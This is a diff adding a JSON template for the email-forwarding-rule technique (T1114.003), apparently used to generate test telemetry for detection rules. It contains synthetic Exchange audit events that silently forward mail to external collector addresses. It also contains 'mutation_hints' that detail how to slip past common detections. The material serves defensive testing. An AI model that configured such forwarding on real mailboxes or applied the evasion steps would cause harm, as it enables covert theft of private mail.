@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1114.003",
+  "technique_name": "Email Collection: Email Forwarding Rule",
+  "tactic": "Collection",
+  "events": [
+    {
+      "note": "New inbox rule that auto-forwards mail to an external address and deletes the original — classic BEC exfil + hide pattern.",
+      "sourcetype": "_json",
+      "template": {
+        "Workload": "Exchange",
+        "Operation": "New-InboxRule",
+        "UserId": "{cloud_user}",
+        "UserKey": "{cloud_user}",
+        "ClientIP": "{cloud_ip}",
+        "ResultStatus": "True",
+        "RuleName": "...",
+        "Parameters": "[{\"Name\":\"AlwaysDeleteOutlookRulesBlob\",\"Value\":\"False\"},{\"Name\":\"Force\",\"Value\":\"False\"},{\"Name\":\"ForwardTo\",\"Value\":\"exfil@protonmail.com\"},{\"Name\":\"DeleteMessage\",\"Value\":\"True\"},{\"Name\":\"Name\",\"Value\":\".\"},{\"Name\":\"StopProcessingRules\",\"Value\":\"True\"}]"
+      },
+      "count": 1,
+      "spread_seconds": 2
+    },
+    {
+      "note": "Mailbox-level forwarding to an external SMTP address — survives inbox-rule cleanup and forwards ALL mail silently.",
+      "sourcetype": "_json",
+      "template": {
+        "Workload": "Exchange",
+        "Operation": "Set-Mailbox",
+        "UserId": "{cloud_user}",
+        "UserKey": "{cloud_user}",
+        "ClientIP": "{cloud_ip}",
+        "ResultStatus": "True",
+        "Parameters": "[{\"Name\":\"Identity\",\"Value\":\"{cloud_user}\"},{\"Name\":\"ForwardingSmtpAddress\",\"Value\":\"smtp:collector@mail.ru\"},{\"Name\":\"DeliverToMailboxAndForward\",\"Value\":\"False\"}]"
+      },
+      "count": 1,
+      "spread_seconds": 3
+    }
+  ],
+  "mutation_hints": {
+    "evadable_fields": [
+      "Operation",
+      "Parameters",
+      "ClientIP",
+      "RuleName",
+      "Workload",
+      "UserKey",
+      "ResultStatus"
+    ],
+    "objective": "Establish covert, persistent external mail exfiltration via inbox or mailbox forwarding",
+    "dwell_threshold_seconds": 180,
+    "detection_anchors": [
+      "Field match: Operation=New-InboxRule → change to Set-InboxRule (modifying an existing rule rather than creating a new one — many rules only catch 'New-' operations); or use UpdateInboxRules (Outlook client-side equivalent)",
+      "Wildcard match: Parameters contains ForwardTo → change to ForwardAsAttachmentTo (forwards as attachment — different parameter name that avoids 'ForwardTo' pattern) or RedirectTo (redirect vs forward — different field name)",
+      "Wildcard match: Parameters contains DeleteMessage=True → change to False (forward without deleting original — less obvious evasion; exfil still happens but the DeleteMessage trigger is gone)",
+      "Field match: Operation=Set-Mailbox AND Parameters contains ForwardingSmtpAddress → use DeliverToMailboxAndForward=True instead of False — mail still forwards externally but also stays in mailbox, making it look more like a legitimate forward-and-keep rule",
+      "Field: ClientIP → use a different cloud exit IP or an internal IP if the attacker is already inside the network — some rules anchor on known-bad external IPs",
+      "Field: Workload=Exchange → keep Exchange; changing to a different workload changes the operation type entirely",
+      "Field: RuleName → use a benign-looking name like 'Archive', 'Backup', or 'Newsletter Filter' instead of '.' (a single dot is itself an indicator of obfuscated rule naming)"
+    ]
+  }
+}
